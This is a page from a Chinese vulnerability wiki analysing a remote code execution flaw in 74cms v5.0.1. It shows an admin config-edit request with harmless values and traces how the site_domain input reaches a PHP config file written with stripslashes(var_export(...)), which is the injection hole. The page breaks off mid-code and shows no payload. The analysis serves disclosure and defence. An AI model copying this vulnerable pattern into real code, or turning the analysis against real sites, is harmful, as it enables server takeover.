<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/74cms/74cms%20v5.0.1%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>74cms v5.0.1远程执行代码 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "74cms v5.0.1\u8fdc\u7a0b\u6267\u884c\u4ee3\u7801", url: "#_top", children: [
              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
              {title: "\u56db\u3001\u53c2\u8003\u94fe\u63a5", url: "#_5" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../74cms%20v6.0.4%20%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../74cms%20v6.0.4%20%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/" class="btn btn-xs btn-link">
        74cms v6.0.4 反射型xss
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../74cms%20v5.0.1%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../74cms%20v5.0.1%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-link">
        74cms v5.0.1 前台sql注入
      </a>
    </div>
    
  </div>

    

    <h1 id="74cms-v501">74cms v5.0.1远程执行代码<a class="headerlink" href="#74cms-v501" title="Permanent link">&para;</a></h1>
<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>74cms v5.0.1</p>
<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<h3 id="_4">漏洞分析<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
<p><img alt="" src="../resource/74cmsv5.0.1%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/media/rId25.png" /></p>
<div class="codehilite"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/74cms/index.php?m=Admin&amp;c=config&amp;a=edit</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">127.0.0.1</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">application/json, text/javascript, */*; q=0.01</span>
<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="na">Referer</span><span class="o">:</span> <span class="l">http://127.0.0.1/74cms/index.php?m=Admin&amp;c=Config&amp;a=index</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded; charset=UTF-8</span>
<span class="na">X-Requested-With</span><span class="o">:</span> <span class="l">XMLHttpRequest</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">391</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">PHPSESSID=arm0lvlbbfocml5vvac1tf3ph3; think_language=zh-CN; think_template=default</span>

<span class="nt">site_name</span><span class="o">=</span><span class="s">%E9%AA%91%E5%A3%AB%E4%BA%BA%E6%89%8D%E7%B3%BB%E7%BB%9F</span><span class="p">&amp;</span><span class="nt">site_domain</span><span class="o">=</span><span class="s">127.0.0.1</span><span class="p">&amp;</span><span class="nt">site_dir</span><span class="o">=</span><span class="s">%2F74cms%2F</span><span class="p">&amp;</span><span class="nt">top_tel</span><span class="o">=</span><span class="s">000-00000000</span><span class="p">&amp;</span><span class="nt">bootom_tel</span><span class="o">=</span><span class="s">000-00000000</span><span class="p">&amp;</span><span class="nt">contact_email</span><span class="o">=</span><span class="p">&amp;</span><span class="nt">address</span><span class="o">=</span><span class="s">00%E7%9C%8100%E5%B8%8200%E8%B7%AF00%E5%8F%B70%E5%A4%A7%E5%8E%A600%E6%A5%BC</span><span class="p">&amp;</span><span class="nt">bottom_other</span><span class="o">=</span><span class="s">Copyright+%C2%A9+2019+74cms.com+All+Right+Reserved+</span><span class="p">&amp;</span><span class="nt">icp</span><span class="o">=</span><span class="s">icp000000000</span><span class="p">&amp;</span><span class="nt">isclose</span><span class="o">=</span><span class="s">0</span><span class="p">&amp;</span><span class="nt">close_reason</span><span class="o">=</span><span class="p">&amp;</span><span class="nt">statistics</span><span class="o">=</span><span class="p">&amp;</span><span class="nt">logo_home</span><span class="o">=</span><span class="p">&amp;</span><span class="nt">logo_other</span><span class="o">=</span>
</code></pre></div>

<p>c=config&amp;a=edit -&gt; Controller=config&amp;action=edit -&gt;
/Application/Admin/Controller/ConfigController.class.php Line 9:
I(\'request.site_domain\',\'\',\'trim\') -&gt; trim($site_domain,\'/\')
-&gt; \'.\'.implode(\'.\',$domain) -&gt; array(\'domain\'=&gt;$domain) -&gt;
$this-&gt;update_config($config,CONF_PATH.\'url.php\')</p>
<div class="codehilite"><pre><span></span><code><span class="nx">public</span><span class="w"> </span><span class="nx">function</span><span class="w"> </span><span class="nx">edit</span><span class="p">(){</span>
<span class="w">       </span><span class="k">if</span><span class="p">(</span><span class="nx">IS_POST</span><span class="p">){</span>
<span class="w">           </span><span class="err">$</span><span class="nx">site_domain</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">I</span><span class="p">(</span><span class="err">&#39;</span><span class="nx">request</span><span class="p">.</span><span class="nx">site_domain</span><span class="sc">&#39;,&#39;&#39;,&#39;</span><span class="nx">trim</span><span class="err">&#39;</span><span class="p">);</span>
<span class="w">           </span><span class="err">$</span><span class="nx">site_domain</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">trim</span><span class="p">(</span><span class="err">$</span><span class="nx">site_domain</span><span class="p">,</span><span class="sc">&#39;/&#39;</span><span class="p">);</span>
<span class="w">           </span><span class="err">$</span><span class="nx">site_dir</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">I</span><span class="p">(</span><span class="err">&#39;</span><span class="nx">request</span><span class="p">.</span><span class="nx">site_dir</span><span class="err">&#39;</span><span class="p">,</span><span class="nx">C</span><span class="p">(</span><span class="err">&#39;</span><span class="nx">qscms_site_dir</span><span class="err">&#39;</span><span class="p">),</span><span class="err">&#39;</span><span class="nx">trim</span><span class="err">&#39;</span><span class="p">);</span>
<span class="w">           </span><span class="err">$</span><span class="nx">site_dir</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="err">$</span><span class="nx">site_dir</span><span class="o">==</span><span class="err">&#39;</span><span class="sc">&#39;?&#39;</span><span class="o">/</span><span class="err">&#39;</span><span class="p">:</span><span class="err">$</span><span class="nx">site_dir</span><span class="p">;</span>
<span class="w">           </span><span class="err">$</span><span class="nx">site_dir</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="err">$</span><span class="nx">site_dir</span><span class="o">==</span><span class="sc">&#39;/&#39;</span><span class="p">?</span><span class="err">$</span><span class="nx">site_dir</span><span class="p">:(</span><span class="sc">&#39;/&#39;</span><span class="p">.</span><span class="nx">trim</span><span class="p">(</span><span class="err">$</span><span class="nx">site_dir</span><span class="p">,</span><span class="sc">&#39;/&#39;</span><span class="p">).</span><span class="sc">&#39;/&#39;</span><span class="p">);</span>
<span class="w">           </span><span class="err">$</span><span class="nx">_POST</span><span class="p">[</span><span class="err">&#39;</span><span class="nx">site_dir</span><span class="err">&#39;</span><span class="p">]</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="err">$</span><span class="nx">site_dir</span><span class="p">;</span>
<span class="w">           </span><span class="k">if</span><span class="p">(</span><span class="err">$</span><span class="nx">site_domain</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="err">$</span><span class="nx">site_domain</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">C</span><span class="p">(</span><span class="err">&#39;</span><span class="nx">qscms_site_domain</span><span class="err">&#39;</span><span class="p">)){</span>
<span class="w">               </span><span class="k">if</span><span class="p">(</span><span class="err">$</span><span class="nx">site_domain</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">C</span><span class="p">(</span><span class="err">&#39;</span><span class="nx">qscms_wap_domain</span><span class="err">&#39;</span><span class="p">)){</span>
<span class="w">                   </span><span class="err">$</span><span class="nx">this</span><span class="o">-&gt;</span><span class="nx">returnMsg</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="err">&#39;</span><span class="nx">主域名不能与触屏版域名重复</span><span class="err">！&#39;</span><span class="p">);</span>
<span class="w">               </span><span class="p">}</span>
<span class="w">               </span><span class="err">$</span><span class="nx">str</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">str_replace</span><span class="p">(</span><span class="err">&#39;</span><span class="nx">http</span><span class="p">:</span><span class="c1">//&#39;,&#39;&#39;,$site_domain);</span>
<span class="w">               </span><span class="err">$</span><span class="nx">str</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">str_replace</span><span class="p">(</span><span class="err">&#39;</span><span class="nx">https</span><span class="p">:</span><span class="c1">//&#39;,&#39;&#39;,$str);</span>
<span class="w">               </span><span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="err">&#39;</span><span class="o">/</span><span class="nx">com</span><span class="p">.</span><span class="nx">cn</span><span class="o">|</span><span class="nx">net</span><span class="p">.</span><span class="nx">cn</span><span class="o">|</span><span class="nx">gov</span><span class="p">.</span><span class="nx">cn</span><span class="o">|</span><span class="nx">org</span><span class="p">.</span><span class="nx">cn</span><span class="err">$</span><span class="o">/</span><span class="err">&#39;</span><span class="p">,</span><span class="err">$</span><span class="nx">str</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="p">=</span><span class="w"> </span><span class="mi">1</span><span class="p">){</span>
<span class="w">                   </span><span class="err">$</span><span class="nx">domain</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">array_slice</span><span class="p">(</span><span class="nx">explode</span><span class="p">(</span><span class="sc">&#39;.&#39;</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">str</span><span class="p">),</span><span class="w"> </span><span class="o">-</span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">);</span>
<span class="w">               </span><span class="p">}</span><span class="k">else</span><span class="p">{</span>
<span class="w">                   </span><span class="err">$</span><span class="nx">domain</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">array_slice</span><span class="p">(</span><span class="nx">explode</span><span class="p">(</span><span class="sc">&#39;.&#39;</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">str</span><span class="p">),</span><span class="w"> </span><span class="o">-</span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">);</span>
<span class="w">               </span><span class="p">}</span>
<span class="w">               </span><span class="err">$</span><span class="nx">domain</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="sc">&#39;.&#39;</span><span class="p">.</span><span class="nx">implode</span><span class="p">(</span><span class="sc">&#39;.&#39;</span><span class="p">,</span><span class="err">$</span><span class="nx">domain</span><span class="p">);</span>
<span class="w">               </span><span class="err">$</span><span class="nx">config</span><span class="p">[</span><span class="err">&#39;</span><span class="nx">SESSION_OPTIONS</span><span class="err">&#39;</span><span class="p">]</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">array</span><span class="p">(</span><span class="err">&#39;</span><span class="nx">domain</span><span class="err">&#39;</span><span class="o">=&gt;</span><span class="err">$</span><span class="nx">domain</span><span class="p">);</span>
<span class="w">               </span><span class="err">$</span><span class="nx">config</span><span class="p">[</span><span class="err">&#39;</span><span class="nx">COOKIE_DOMAIN</span><span class="err">&#39;</span><span class="p">]</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="err">$</span><span class="nx">domain</span><span class="p">;</span>
<span class="w">               </span><span class="err">$</span><span class="nx">this</span><span class="o">-&gt;</span><span class="nx">update_config</span><span class="p">(</span><span class="err">$</span><span class="nx">config</span><span class="p">,</span><span class="nx">CONF_PATH</span><span class="p">.</span><span class="err">&#39;</span><span class="nx">url</span><span class="p">.</span><span class="nx">php</span><span class="err">&#39;</span><span class="p">);</span>
<span class="w">           </span><span class="p">}</span>
</code></pre></div>

<p>/ThinkPHP/Common/functions.php第271行中的I（\'request.site_domain\'，\'\'，\'trim\'）是字符串。request.site_domain-&gt;
$ _REQUEST [\'site_domain\']-&gt; $ _ REQUEST
[\'site_domain\']是字符串-&gt;修剪（$ _REQUEST [\'site_domain\']）</p>
<div class="codehilite"><pre><span></span><code><span class="n">function</span><span class="w"> </span><span class="n">I</span><span class="p">(</span><span class="o">$</span><span class="n">name</span><span class="p">,</span><span class="o">$</span><span class="n">default</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="o">$</span><span class="n">filter</span><span class="o">=</span><span class="nb nb-Type">null</span><span class="p">,</span><span class="o">$</span><span class="n">datas</span><span class="o">=</span><span class="nb nb-Type">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="o">...</span>
<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">strpos</span><span class="p">(</span><span class="o">$</span><span class="n">name</span><span class="p">,</span><span class="s1">&#39;.&#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="err">指定参数来源</span>
<span class="w">        </span><span class="n">list</span><span class="p">(</span><span class="o">$</span><span class="n">method</span><span class="p">,</span><span class="o">$</span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w">   </span><span class="n">explode</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">,</span><span class="o">$</span><span class="n">name</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span><span class="k">else</span><span class="p">{</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="err">默认为自动判断</span>
<span class="w">        </span><span class="o">$</span><span class="n">method</span><span class="w"> </span><span class="o">=</span><span class="w">   </span><span class="s1">&#39;param&#39;</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="n">switch</span><span class="p">(</span><span class="n">strtolower</span><span class="p">(</span><span class="o">$</span><span class="n">method</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">case</span><span class="w"> </span><span class="s1">&#39;get&#39;</span><span class="w">     </span><span class="p">:</span><span class="w">   </span>
<span class="w">            </span><span class="o">$</span><span class="n">input</span><span class="w"> </span><span class="o">=&amp;</span><span class="w"> </span><span class="o">$</span><span class="n">_GET</span><span class="p">;</span>
<span class="w">            </span><span class="k">break</span><span class="p">;</span>
<span class="w">        </span><span class="n">case</span><span class="w"> </span><span class="s1">&#39;post&#39;</span><span class="w">    </span><span class="p">:</span><span class="w">   </span>
<span class="w">            </span><span class="o">$</span><span class="n">input</span><span class="w"> </span><span class="o">=&amp;</span><span class="w"> </span><span class="o">$</span><span class="n">_POST</span><span class="p">;</span>
<span class="w">            </span><span class="k">break</span><span class="p">;</span>
<span class="w">        </span><span class="o">...</span>
<span class="w">        </span><span class="n">case</span><span class="w"> </span><span class="s1">&#39;request&#39;</span><span class="w"> </span><span class="p">:</span><span class="w">   </span>
<span class="w">            </span><span class="o">$</span><span class="n">input</span><span class="w"> </span><span class="o">=&amp;</span><span class="w"> </span><span class="o">$</span><span class="n">_REQUEST</span><span class="p">;</span><span class="w">   </span>
<span class="w">            </span><span class="k">break</span><span class="p">;</span>
<span class="w">        </span><span class="o">...</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="o">==$</span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="err">获取全部变量</span>
<span class="w">      </span><span class="o">...</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span><span class="n">elseif</span><span class="p">(</span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">input</span><span class="p">[</span><span class="o">$</span><span class="n">name</span><span class="p">]))</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="err">取值操作</span>
<span class="w">        </span><span class="o">$</span><span class="n">data</span><span class="w">       </span><span class="o">=</span><span class="w">   </span><span class="o">$</span><span class="n">input</span><span class="p">[</span><span class="o">$</span><span class="n">name</span><span class="p">];</span>
<span class="w">        </span><span class="o">$</span><span class="n">filters</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">filter</span><span class="p">)</span><span class="w"> </span><span class="err">?</span><span class="w"> </span><span class="o">$</span><span class="n">filter</span><span class="o">.</span><span class="s1">&#39;,&#39;</span><span class="o">.</span><span class="n">C</span><span class="p">(</span><span class="s1">&#39;DEFAULT_FILTER&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">C</span><span class="p">(</span><span class="s1">&#39;DEFAULT_FILTER&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="o">//$</span><span class="n">filters</span><span class="w">    </span><span class="o">=</span><span class="w">   </span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">filter</span><span class="p">)</span><span class="err">?</span><span class="o">$</span><span class="n">filter</span><span class="p">:</span><span class="n">C</span><span class="p">(</span><span class="s1">&#39;DEFAULT_FILTER&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="o">$</span><span class="n">filters</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">if</span><span class="p">(</span><span class="n">is_string</span><span class="p">(</span><span class="o">$</span><span class="n">filters</span><span class="p">)){</span>
<span class="w">                </span><span class="k">if</span><span class="p">(</span><span class="mi">0</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="n">strpos</span><span class="p">(</span><span class="o">$</span><span class="n">filters</span><span class="p">,</span><span class="s1">&#39;/&#39;</span><span class="p">)){</span>
<span class="w">                    </span><span class="k">if</span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="o">!==</span><span class="w"> </span><span class="n">preg_match</span><span class="p">(</span><span class="o">$</span><span class="n">filters</span><span class="p">,(</span><span class="n">string</span><span class="p">)</span><span class="o">$</span><span class="n">data</span><span class="p">)){</span>
<span class="w">                        </span><span class="o">//</span><span class="w"> </span><span class="err">支持正则验证</span>
<span class="w">                        </span><span class="k">return</span><span class="w">   </span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">default</span><span class="p">)</span><span class="w"> </span><span class="err">?</span><span class="w"> </span><span class="o">$</span><span class="n">default</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nb nb-Type">null</span><span class="p">;</span>
<span class="w">                    </span><span class="p">}</span>
<span class="w">                </span><span class="p">}</span><span class="k">else</span><span class="p">{</span>
<span class="w">                    </span><span class="o">$</span><span class="n">filters</span><span class="w">    </span><span class="o">=</span><span class="w">   </span><span class="n">explode</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span><span class="o">$</span><span class="n">filters</span><span class="p">);</span><span class="w">                    </span>
<span class="w">                </span><span class="p">}</span>
<span class="w">            </span><span class="p">}</span><span class="n">elseif</span><span class="p">(</span><span class="n">is_int</span><span class="p">(</span><span class="o">$</span><span class="n">filters</span><span class="p">)){</span>
<span class="w">                </span><span class="o">$</span><span class="n">filters</span><span class="w">    </span><span class="o">=</span><span class="w">   </span><span class="n">array</span><span class="p">(</span><span class="o">$</span><span class="n">filters</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span>

<span class="w">            </span><span class="k">if</span><span class="p">(</span><span class="n">is_array</span><span class="p">(</span><span class="o">$</span><span class="n">filters</span><span class="p">)){</span>
<span class="w">                </span><span class="n">foreach</span><span class="p">(</span><span class="o">$</span><span class="n">filters</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="o">$</span><span class="n">filter</span><span class="p">){</span>
<span class="w">                    </span><span class="k">if</span><span class="p">(</span><span class="n">function_exists</span><span class="p">(</span><span class="o">$</span><span class="n">filter</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">                        </span><span class="o">$</span><span class="n">data</span><span class="w">   </span><span class="o">=</span><span class="w">   </span><span class="n">is_array</span><span class="p">(</span><span class="o">$</span><span class="n">data</span><span class="p">)</span><span class="w"> </span><span class="err">?</span><span class="w"> </span><span class="n">array_map_recursive</span><span class="p">(</span><span class="o">$</span><span class="n">filter</span><span class="p">,</span><span class="o">$</span><span class="n">data</span><span class="p">)</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="o">$</span><span class="n">filter</span><span class="p">(</span><span class="o">$</span><span class="n">data</span><span class="p">);</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="err">参数过滤</span>
<span class="w">                    </span><span class="p">}</span><span class="k">else</span><span class="p">{</span>
<span class="w">                        </span><span class="o">$</span><span class="n">data</span><span class="w">   </span><span class="o">=</span><span class="w">   </span><span class="n">filter_var</span><span class="p">(</span><span class="o">$</span><span class="n">data</span><span class="p">,</span><span class="n">is_int</span><span class="p">(</span><span class="o">$</span><span class="n">filter</span><span class="p">)</span><span class="w"> </span><span class="err">?</span><span class="w"> </span><span class="o">$</span><span class="n">filter</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">filter_id</span><span class="p">(</span><span class="o">$</span><span class="n">filter</span><span class="p">));</span>
<span class="w">                        </span><span class="k">if</span><span class="p">(</span><span class="bp">false</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="o">$</span><span class="n">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                            </span><span class="k">return</span><span class="w">   </span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">default</span><span class="p">)</span><span class="w"> </span><span class="err">?</span><span class="w"> </span><span class="o">$</span><span class="n">default</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nb nb-Type">null</span><span class="p">;</span>
<span class="w">                        </span><span class="p">}</span>
<span class="w">                    </span><span class="p">}</span>
<span class="w">                </span><span class="p">}</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">empty</span><span class="p">(</span><span class="o">$</span><span class="n">type</span><span class="p">)){</span>
<span class="w">          </span><span class="o">...</span>
<span class="w">    </span><span class="p">}</span><span class="k">else</span><span class="p">{</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="err">变量默认值</span>
<span class="w">        </span><span class="o">$</span><span class="n">data</span><span class="w">       </span><span class="o">=</span><span class="w">    </span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">default</span><span class="p">)</span><span class="err">?</span><span class="o">$</span><span class="n">default</span><span class="p">:</span><span class="nb nb-Type">null</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="n">is_array</span><span class="p">(</span><span class="o">$</span><span class="n">data</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">array_walk_recursive</span><span class="p">(</span><span class="o">$</span><span class="n">data</span><span class="p">,</span><span class="s1">&#39;think_filter&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="o">$</span><span class="n">data</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

<p>返回到/Application/Admin/Controller/ConfigController.class.php第29行：array（\'SESSION_OPTIONS\'=&gt;
array（\'domain\'=&gt; $ domain），\'COOKIE_DOMAIN\'=&gt; $ domain） -&gt;
update_config（$ config， CONF_PATH.\'url.php\'）</p>
<div class="codehilite"><pre><span></span><code><span class="err">$</span><span class="n">config</span><span class="p">[</span><span class="s">&#39;SESSION_OPTIONS&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">array</span><span class="p">(</span><span class="s">&#39;domain&#39;</span><span class="o">=&gt;</span><span class="err">$</span><span class="n">domain</span><span class="p">);</span>
<span class="err">$</span><span class="n">config</span><span class="p">[</span><span class="s">&#39;COOKIE_DOMAIN&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">domain</span><span class="p">;</span>
<span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">update_config</span><span class="p">(</span><span class="err">$</span><span class="n">config</span><span class="p">,</span><span class="n">CONF_PATH</span><span class="p">.</span><span class="s">&#39;url.php&#39;</span><span class="p">);</span>
</code></pre></div>

<p>/Application/Common/Controller/BackendController.class.php第467
行中的update_config（$ config，CONF_PATH.\'url.php\'）：</p>
<p>multimerge（$ config，$ new_config） -&gt; file_put_contents（$
config_file，" \&lt;？php \ nreturn"。stripslashes（var_export（$
config，true））。";"，LOCK_EX）</p>
<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="kr">public</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">update_config</span><span class="p">(</span><span class="nx">$new_config</span><span class="p">,</span><span class="w"> </span><span class="nx">$config_file</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="o">!</span><span class="nx">is_file</span><span class="p">(</span><span class="nx">$config_file</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">$config_file</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">HOME_CONFIG_PATH</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="s1">&#39;config.php&#39;</span><span class="p">;</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">is_writable</span><span class="p">(</span><span class="nx">$config_file</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">$config</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="w"> </span><span class="nx">$config_file</span><span class="p">;</span>
<span class="w">            </span><span class="nx">$config</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">multimerge</span><span class="p">(</span><span class="nx">$config</span><span class="p">,</span><span class="w"> </span><span class="nx">$new_config</span><span class="p">);</span>
<span class="w">            </span><span class="k">if</span><span class="p">(</span><span class="nx">$config</span><span class="p">[</span><span class="s1">&#39;SESSION_OPTIONS&#39;</span><span class="p">]){</span>
<span class="w">                </span><span class="nx">$config</span><span class="p">[</span><span class="s1">&#39;SESSION_OPTIONS&#39;</span><span class="p">][</span><span class="s1">&#39;path&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">SESSION_PATH</span><span class="p">;</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">            </span><span class="nx">file_put_contents</span><span class="p">(</span><span class="nx">$config_file</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="cp">&lt;?php</span> <span class="nx">\nreturn</span> <span class="s2">&quot; . stripslashes(var_export(</span><span class="si">$config</span><span class="s2">, true)) . &quot;</span><span class="p">;</span><span class="s2">&quot;, LOCK_EX);</span>
